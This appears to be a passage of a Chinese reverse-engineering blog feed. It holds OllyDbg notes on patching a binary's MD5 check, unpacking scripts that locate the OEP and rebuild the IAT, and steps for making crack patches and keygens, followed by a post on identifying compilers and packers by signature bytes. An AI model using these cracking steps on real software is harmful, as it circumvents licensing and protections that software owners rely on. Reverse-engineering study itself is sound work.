data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230821165849410.png\" alt=\"image-20230821165849410\"></p>\n<p>这个函数是读文件的地方</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230821165952866.png\" alt=\"image-20230821165952866\"></p>\n<p>返回到上层，4B1F74 就是读取 md5 的地方</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230821171219967.png\" alt=\"image-20230821171219967\"></p>\n<p>被修改后的 md5： 4b1f74</p>\n<p>DE7449CB2D3E11159C405532F86B6657</p>\n<p>重新安装找到原来的 md5:</p>\n<p>11ea70a3c3735c29b48552776756406a</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">004B1F74  |.  8D5D EC       lea      ebx,dword ptr ss:[ebp-0x14]</span><br><span class=\"line\">004B1F77  |&gt;  8D55 E8       /lea     edx,dword ptr ss:[ebp-0x18]</span><br><span class=\"line\">004B1F7A  |.  33C0          |xor     eax,eax</span><br><span class=\"line\">004B1F7C  |.  8A03          |mov     al,byte ptr ds:[ebx]</span><br><span class=\"line\">004B1F7E  |.  E8 35F1FFFF   |call    004B10B8</span><br><span class=\"line\">004B1F83  |.  8B55 E8       |mov     edx,dword ptr ss:[ebp-0x18]</span><br><span class=\"line\">004B1F86  |.  8BC7          |mov     eax,edi</span><br><span class=\"line\">004B1F88  |.  E8 3F26F5FF   |call    004045CC</span><br><span class=\"line\">004B1F8D  |.  43            |inc     ebx</span><br><span class=\"line\">004B1F8E  |.  4E            |dec     esi</span><br><span class=\"line\">004B1F8F  |.^ 75 E6         \\jnz     short 004B1F77</span><br><span class=\"line\"></span><br><span class=\"line\">8D 5D EC 8D 55 E8 33 C0 8A 03 E8 35 F1 FF FF 8B 55 E8 8B C7 E8 3F 26 F5 FF 43 4E 75 E6</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><img data-src=\"../AppData/Roaming/Typora/typora-user-images/image-20230821181650298.png\" alt=\"image-20230821181650298\"></p>\n<p>找一块全 0 的地址  56b0a0</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230821180304129.png\" alt=\"image-20230821180304129\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0056B0A0      C745 EC 11EA7&gt;mov     dword ptr ss:[ebp-0x14],0xA370EA11</span><br><span class=\"line\">0056B0A7      C745 F0 C3735&gt;mov     dword ptr ss:[ebp-0x10],0x295C73C3</span><br><span class=\"line\">0056B0AE      C745 F4 B4855&gt;mov     dword ptr ss:[ebp-0xC],0x775285B4</span><br><span class=\"line\">0056B0B5      C745 F8 67564&gt;mov     dword ptr ss:[ebp-0x8],0x6A405667</span><br><span class=\"line\">0056B0BC      8D5D EC       lea     ebx,dword ptr ss:[ebp-0x14]</span><br><span class=\"line\">0056B0BF      8D55 E8       lea     edx,dword ptr ss:[ebp-0x18]</span><br><span class=\"line\">0056B0C2      33C0          xor     eax,eax</span><br><span class=\"line\">0056B0C4      8A03          mov     al,byte ptr ds:[ebx]</span><br><span class=\"line\">0056B0C6      E8 ED5FF4FF   call    004B10B8</span><br><span class=\"line\">0056B0CB      8B55 E8       mov     edx,dword ptr ss:[ebp-0x18]</span><br><span class=\"line\">0056B0CE      8BC7          mov     eax,edi</span><br><span class=\"line\">0056B0D0      E8 F794E9FF   call    004045CC</span><br><span class=\"line\">0056B0D5      43            inc     ebx</span><br><span class=\"line\">0056B0D6      4E            dec     esi</span><br><span class=\"line\">0056B0D7    ^ 75 E6         jnz     short 0056B0BF</span><br><span class=\"line\">0056B0D9    ^ E9 B36EF4FF   jmp     004B1F91</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>附上 delphi 按键断点</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var Addr</span><br><span class=\"line\">mov Addr,401000</span><br><span class=\"line\">loop:</span><br><span class=\"line\">find Addr,#740E8BD38B83????????FF93????????#</span><br><span class=\"line\">cmp $RESULT,0</span><br><span class=\"line\">je Exit</span><br><span class=\"line\">add $RESULT,0A</span><br><span class=\"line\">bp $RESULT</span><br><span class=\"line\">add $RESULT,1</span><br><span class=\"line\">mov Addr,$RESULT</span><br><span class=\"line\">jmp loop</span><br><span class=\"line\">Exit:</span><br><span class=\"line\">ret</span><br></pre></td></tr></table></figure>\n<h1 id=\"od-function-script\"><a class=\"markdownIt-Anchor\" href=\"#od-function-script\">#</a> OD function script</h1>\n<h2 id=\"导入表iat\"><a class=\"markdownIt-Anchor\" href=\"#导入表iat\">#</a> 导入表（IAT）</h2>\n<blockquote>\n<p>Import Address Table 由于导入函数就是被程序调用但其执行代码又不在程序中的函数，这些函数的代码位于一个或者多个 DLL 中。当 PE 文件被装入内存的时候，Windows 装载器才将 DLL 装入，并将调用导入函数的指令和函数实际所处的地址联系起来 (动态连接)，这操作就需要导入表完成。其中导入地址表就指示函数实际地址。</p>\n</blockquote>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sti   f7</span><br><span class=\"line\">sto   f8</span><br><span class=\"line\">bp    f2</span><br><span class=\"line\">run   f9</span><br><span class=\"line\">bphws [],&quot;r&quot;   硬件断点 hr esp </span><br></pre></td></tr></table></figure>\n<h2 id=\"oep-script\"><a class=\"markdownIt-Anchor\" href=\"#oep-script\">#</a> OEP script</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bp oep</span><br><span class=\"line\">run </span><br><span class=\"line\">sti</span><br><span class=\"line\">MSG &quot;OEP 到了&quot;</span><br><span class=\"line\">ret </span><br></pre></td></tr></table></figure>\n<h2 id=\"iat-script\"><a class=\"markdownIt-Anchor\" href=\"#iat-script\">#</a> IAT script</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sti\t;pushad</span><br><span class=\"line\">bphws esp,&quot;r&quot; ;hr esp</span><br><span class=\"line\">run</span><br><span class=\"line\">sti</span><br><span class=\"line\">sti</span><br><span class=\"line\">sti\t;到了jnz</span><br><span class=\"line\">bp eip\t;</span><br><span class=\"line\">@LOOP:</span><br><span class=\"line\">run</span><br><span class=\"line\">cmp esp,eax</span><br><span class=\"line\">jnz @LOOP</span><br><span class=\"line\">sti</span><br><span class=\"line\">sti</span><br><span class=\"line\">sti</span><br><span class=\"line\"></span><br><span class=\"line\">MSG &quot;到OEP了&quot;</span><br><span class=\"line\">ret</span><br></pre></td></tr></table></figure>\n<p>通过 ff15 或 ff25 找 iat</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 查找ff 15</span><br><span class=\"line\">0041E0CC    56              push    esi</span><br><span class=\"line\">0041E0CD    6A 00           push    0x0</span><br><span class=\"line\">0041E0CF    FF35 2C3F4400   push    dword ptr ds:[0x443F2C]</span><br><span class=\"line\">0041E0D5    FF15 6C214300   call    dword ptr ds:[0x43216C]</span><br><span class=\"line\">0041E0DB    85C0            test    eax,eax</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># iat begin</span><br><span class=\"line\">00431FF8  00000000</span><br><span class=\"line\">00431FFC  00000000</span><br><span class=\"line\">00432000  00970306</span><br><span class=\"line\">00432004  0097030C</span><br><span class=\"line\">00432008  00970312</span><br><span class=\"line\"># iat end</span><br><span class=\"line\">00432548  0097045C</span><br><span class=\"line\">0043254C  00000000</span><br><span class=\"line\">00432550  009704AA</span><br><span class=\"line\">00432554  00000000</span><br><span class=\"line\">00432558  00000000</span><br><span class=\"line\"></span><br><span class=\"line\">把原来的调用改成自己的地址，然后在自己的代码里，跳到真实的api地址</span><br><span class=\"line\"></span><br><span class=\"line\">00970288    68 FF83837C     push    kernel32.ConvertDefaultLocale</span><br><span class=\"line\">0097028D    C3              retn</span><br><span class=\"line\">0097028E    68 9906867C     push    kernel32.EnumResourceLanguagesW</span><br><span class=\"line\">00970293    C3              retn</span><br><span class=\"line\">00970294    68 75B4807C     push    kernel32.GetModuleFileNameW</span><br><span class=\"line\">00970299    C3              retn</span><br><span class=\"line\">0097029A    68 7C0D837C     push    kernel32.lstrcmpA</span><br><span class=\"line\">0097029F    C3              retn</span><br><span class=\"line\">009702A0    68 0216817C     push    kernel32.GetLocaleInfoW</span><br><span class=\"line\">009702A5    C3              retn</span><br><span class=\"line\">009702A6    68 EBAE807C     push    kernel32.LoadLibraryW</span><br><span class=\"line\">009702AB    C3              retn</span><br><span class=\"line\">009702AC    68 74A1807C     push    kernel32.WideCharToMultiByte</span><br><span class=\"line\">009702B1    C3              retn</span><br><span class=\"line\">009702B2    68 17D1807C     push    kernel32.CompareStringA</span><br><span class=\"line\">009702B7    C3              retn</span><br><span class=\"line\">009702B8    68 989C807C     push    kernel32.MultiByteToWideChar</span><br><span class=\"line\">009702BD    C3              retn</span><br><span class=\"line\">009702BE    68 6EBC807C     push    kernel32.FindResourceW</span><br><span class=\"line\">009702C3    C3              retn</span><br><span class=\"line\">009702C4    68 55A0807C     push    kernel32.LoadResource</span><br><span class=\"line\">009702C9    C3              retn</span><br><span class=\"line\">009702CA    68 37CD807C     push    kernel32.SetHandleCount</span><br><span class=\"line\">009702CF    C3              retn</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"修复iat\"><a class=\"markdownIt-Anchor\" href=\"#修复iat\">#</a> 修复 IAT</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mov iat_b,00432000</span><br><span class=\"line\">mov iat_e,00432554  </span><br><span class=\"line\">;iat_b=00432000</span><br><span class=\"line\"></span><br><span class=\"line\">sti\t;pushad</span><br><span class=\"line\">bphws esp,&quot;r&quot; ;hr esp</span><br><span class=\"line\">run</span><br><span class=\"line\">sti</span><br><span class=\"line\">sti</span><br><span class=\"line\">sti\t;到了jnz</span><br><span class=\"line\">bp eip\t;</span><br><span class=\"line\">@LOOP:</span><br><span class=\"line\">run</span><br><span class=\"line\">cmp esp,eax</span><br><span class=\"line\">jnz @LOOP</span><br><span class=\"line\">sti</span><br><span class=\"line\">sti</span><br><span class=\"line\">sti</span><br><span class=\"line\"></span><br><span class=\"line\">MSG &quot;到OEP了&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">@IAT_LOOP:</span><br><span class=\"line\">mov iat,[iat_b]</span><br><span class=\"line\">cmp iat,0</span><br><span class=\"line\">je  @NEXT_LOOP</span><br><span class=\"line\"></span><br><span class=\"line\">mov api,[iat+1]</span><br><span class=\"line\">mov [iat_b],api\t;重建iat</span><br><span class=\"line\"></span><br><span class=\"line\">@NEXT_LOOP:</span><br><span class=\"line\">add iat_b,4</span><br><span class=\"line\">cmp iat_b,iat_e</span><br><span class=\"line\">jne @IAT_LOOP</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">MSG &quot;OK IAT 修复已经完成 fuck kido&quot;</span><br><span class=\"line\">ret</span><br></pre></td></tr></table></figure>\n<p>载入脚本，空格运行</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230824133330558.png\" alt=\"image-20230824133330558\"></p>\n<p>运行结束后，可以看到 iat 已经被修复</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230824133443438.png\" alt=\"image-20230824133443438\"></p>\n<p>修复完所有的 iat 都是有效的</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230824133958639.png\" alt=\"image-20230824133958639\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230824134029024.png\" alt=\"image-20230824134029024\"></p>\n<p>或者直接使用 od 插件 ollydump 也能脱</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230824135813010.png\" alt=\"image-20230824135813010\"></p>\n<h1 id=\"制作补丁\"><a class=\"markdownIt-Anchor\" href=\"#制作补丁\">#</a> 制作补丁</h1>\n<p>吾爱破解内存补丁生成器</p>\n<p>keymake</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4028AB 75 07 jnz short 004028B4</span><br><span class=\"line\"></span><br><span class=\"line\">jnz 0x75</span><br><span class=\"line\">je 0x74</span><br></pre></td></tr></table></figure>\n<p>拖入程序</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230825105921769.png\" alt=\"image-20230825105921769\"></p>\n<p>导出补丁</p>\n<p>如果注册码在程序中以明文存在，可以使用注册机</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">8B4D E8 mov ecx,[local.6]</span><br><span class=\"line\">8B45 E4 mov eax,[local.7]</span><br><span class=\"line\">402880 8A 10   mov dl, byte ptr ds:[eax]    //eax 中即为真实注册码</span><br><span class=\"line\">3A 11   cmp dl, byte ptr ds:[ecx]</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230825111225188.png\" alt=\"image-20230825111225188\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230825111048015.png\" alt=\"image-20230825111048015\"></p>\n<p>用户信息处可以自定义窗口和标题</p>\n<p>生成</p>\n<h1 id=\"x64\"><a class=\"markdownIt-Anchor\" href=\"#x64\">#</a> x64</h1>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0000000000401000</span><br><span class=\"line\">R8b\t\tbyte</span><br><span class=\"line\">R8w\t\tword</span><br><span class=\"line\">R8d\t\tdword\t</span><br><span class=\"line\">R8</span><br><span class=\"line\"></span><br><span class=\"line\">AL</span><br><span class=\"line\">AH</span><br><span class=\"line\">AX</span><br><span class=\"line\">EAX</span><br><span class=\"line\">RAX</span><br><span class=\"line\"></span><br><span class=\"line\">mov r8d,ecx</span><br></pre></td></tr></table></figure>\n<h1 id=\"ida\"><a class=\"markdownIt-Anchor\" href=\"#ida\">#</a> IDA</h1>\n<p>导入文件</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230825113612693.png\" alt=\"image-20230825113612693\"></p>\n",
            "tags": [
                "逆向"
            ]
        },
        {
            "id": "http://example.com/2023/08/15/%E7%A0%B4%E8%A7%A3%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E4%B9%8B%E8%AE%A4%E8%AF%86%E5%A3%B3%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E7%89%B9%E5%BE%81/",
            "url": "http://example.com/2023/08/15/%E7%A0%B4%E8%A7%A3%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E4%B9%8B%E8%AE%A4%E8%AF%86%E5%A3%B3%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E7%89%B9%E5%BE%81/",
            "title": "破解基础知识之认识壳与程序的特征",
            "date_published": "2023-08-15T05:38:45.000Z",
            "content_html": "<h1 id=\"破解基础知识之认识壳与程序的特征\"><a class=\"markdownIt-Anchor\" href=\"#破解基础知识之认识壳与程序的特征\">#</a> 破解基础知识之认识壳与程序的特征</h1>\n<p>一个程序从编译出来的时候一般都是没有壳的，不同编译器编译出的无壳程序也是不相同的，认识了不同编译器编译出来的无壳的程序，再去看无壳程序被加壳程序加壳后的样子就轻松很多，经过对比从而了解不同语言无壳程序和加壳后程序的特征是什么，特征主要从 “入口点代码”、“程序区段” 和 “加载模块” 等信息来确定。<br>\n一：程序是什么语言编译的<br>\n从目前国内接触到程序看，比较流行的编译器有：VC 系列、易语言、.NET、Delphi，一些曾经用的很多但渐渐少了有：VB、ASM、BC++，还有一些用的比较少的有：AutoIt、PB、QT 等，结合实例来看看 “入口点代码”、“程序区段” 和 “加载模块” 等特征。</p>\n<p><strong>一般使用 exeinfo PE 来识别壳和编译程序，但是还需要根据区段信息 (比如.data,.text)，并且结合代码入口特征来充分判断。</strong></p>\n<p>PEinfo 也可以识别，但是由于已经暂停维护，可能会导致误报</p>\n<h2 id=\"vc60\"><a class=\"markdownIt-Anchor\" href=\"#vc60\">#</a> vc6.0</h2>\n<p>VC++ 6.0 编译，无壳程序<br>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230822081440427.png\" alt=\"image-20230822081440427\"></p>\n<p>** 入口特征：**<strong> 入口点代码是固定的代码，入口调用的 API 也是相同的，其中有的 push 地址不同程序可能不同；区段有四个也是固定的.text、.rdata、.data 和.rsrc。</strong></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230822081500143.png\" alt=\"image-20230822081500143\"></p>\n<p>区段特征：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230822081516456.png\" alt=\"image-20230822081516456\"></p>\n<p>特征码： <code>55 8B EC 6A FF 68 ?? ?? ?? ?? 68 ?? ?? ?? ?? 64 A1 00 00 00 00 50 64 89 25 00 00 00 00</code></p>\n<h3 id=\"vc\"><a class=\"markdownIt-Anchor\" href=\"#vc\">#</a> VC++</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">55            PUSH EBP</span><br><span class=\"line\">8BEC          MOV EBP,ESP</span><br><span class=\"line\">83EC 44       SUB ESP,44</span><br><span class=\"line\">56            PUSH ESI</span><br></pre></td></tr></table></figure>\n<h3 id=\"vc-7\"><a class=\"markdownIt-Anchor\" href=\"#vc-7\">#</a> VC 7</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">6A 70              push 70</span><br><span class=\"line\">68 50110001        push hh.01001150</span><br><span class=\"line\">E8 1D020000        call hh.010017B0</span><br><span class=\"line\">33DB               xor ebx,ebx</span><br></pre></td></tr></table></figure>\n<h2 id=\"vs-2008-vs2013\"><a class=\"markdownIt-Anchor\" href=\"#vs-2008-vs2013\">#</a> VS 2008 &amp; VS2013</h2>\n<ul>\n<li>VS 版本的不同会导致编写出的程序特征（链接器、入口点、区段）</li>\n<li>debug 下编译的程序区段的数量相对于 Release 多一些</li>\n<li>release 的入口存在 call ??? jmp ???，debug 可能是两个 call</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>VS 版本</th>\n<th>链接器版本</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>VC 6.0</td>\n<td>6.0</td>\n</tr>\n<tr>\n<td>VC2003</td>\n<td>7.0 / 7.1</td>\n</tr>\n<tr>\n<td>VS2005</td>\n<td>8.0</td>\n</tr>\n<tr>\n<td>VS2008</td>\n<td>9.0</td>\n</tr>\n<tr>\n<td>VS2010</td>\n<td>10.0</td>\n</tr>\n<tr>\n<td>VS2012</td>\n<td>11.0</td>\n</tr>\n<tr>\n<td>VS2013</td>\n<td>12.0</td>\n</tr>\n<tr>\n<td>VS2015</td>\n<td>14.0</td>\n</tr>\n<tr>\n<td>VS2017</td>\n<td>14.1</td>\n</tr>\n<tr>\n<td>VS2019</td>\n<td>14.2</td>\n</tr>\n</tbody>\n</table>\n<p>vs2008</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230822081537484.png\" alt=\"image-20230822081537484\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230822081552368.png\" alt=\"image-20230822081552368\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230822081608085.png\" alt=\"image-20230822081608085\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230822081624203.png\" alt=\"image-20230822081624203\"></p>\n<p><strong>VS 特点：入口点只有两行代码，一个 CALL 后直接 JMP，第一个 CALL 进去后调用的 API 也是相同的；区段相对于 VC6 多了一个.reloc (重定位表)。</strong></p>\n<p>vs2013</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230822081651343.png\" alt=\"image-20230822081651343\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230822081706723.png\" alt=\"image-20230822081706723\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230822081723924.png\" alt=\"image-20230822081723924\"></p>\n<h2 id=\"易语言\"><a class=\"markdownIt-Anchor\" href=\"#易语言\">#</a> 易语言</h2>\n<p>分为独立编译和非独立编译</p>\n<p>独立编译后被识别别 VC6 (ver 0.0.3.8)</p>\n<p>由于易语言独立编译是调用 VC 的链接程序编译的，所以从区段和入口代码特征和 VC 相同</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230822081745844.png\" alt=\"image-20230822081745844\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230822081802797.png\" alt=\"image-20230822081802797\"></p>\n<p>新版 exeinfoPE 识别为 E language/EPL</p>\n<p>非独立编译</p>\n<p>能识别到下面的 ascii，并且有 krnln.fnr 的字符，程序入口会有很多 jmp</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230822081822439.png\" alt=\"image-20230822081822439\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230822081836097.png\" alt=\"image-20230822081836097\"></p>\n<p>搜索中文区段可以看到特征</p>\n<p>push -&gt;call -&gt;jump</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230822081850049.png\" alt=\"image-20230822081850049\"></p>\n<p>运行之后加载 krmln.fnr</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230822081904654.png\" alt=\"image-20230822081904654\"></p>\n<p>独立编译</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230822082005089.png\" alt=\"image-20230822082005089\"></p>\n<p>还是会有很多 jmp 调用 api</p>\n<p>独立编译 / 非独立编译都被识别为四个区段</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230822082017114.png\" alt=\"image-20230822082017114\"></p>\n<p>易语言特点：可以从程序里找一些 call 的调用最终都会走到上面核心代码图位置，这个方法可以区分和 VC 的区别，非独立编译比较容易识别，入口特征和模块特征都有 krnln.fnr。</p>\n<h2 id=\"delhpi\"><a class=\"markdownIt-Anchor\" href=\"#delhpi\">#</a> Delhpi</h2>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230822082030859.png\" alt=\"image-20230822082030859\"></p>\n<p>code + data + bss (未初始化的数据)</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230822082042537.png\" alt=\"image-20230822082042537\"></p>\n<p>OEP：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230822082121357.png\" alt=\"image-20230822082121357\"></p>\n<p><strong>特征：入口点有五个 call，第一个 call 的内部调用了 GetModuleHandleA，最后有一堆 00</strong></p>\n<p>第一个 call 内部：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230822082142314.png\" alt=\"image-20230822082142314\"></p>\n<p>和 BC++ 特征相同，都是使用 FF25 调到函数。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230822082155469.png\" 